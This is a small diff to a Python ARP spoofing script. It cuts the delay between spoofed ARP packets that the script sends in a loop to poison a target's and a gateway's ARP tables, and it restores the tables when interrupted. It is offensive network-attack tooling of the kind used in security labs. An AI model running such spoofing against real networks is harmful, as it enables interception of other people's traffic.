@@ -38,14 +38,14 @@ def get_arguments():
 
 
 def spoof_thread(target_ip, gateway_ip):
-    time.sleep(3)
+    time.sleep(1)
     sentPackets = 0
     try:
         while True:
             spoof(target_ip, gateway_ip)
             sentPackets += 2
             print(f"\r[+] Total arp packets sent: {sentPackets}", end="")
-            time.sleep(2)
+            time.sleep(1)
     except KeyboardInterrupt:
         print("\nReseting ARP tables. Please wait...")
         restore(target_ip, gateway_ip)
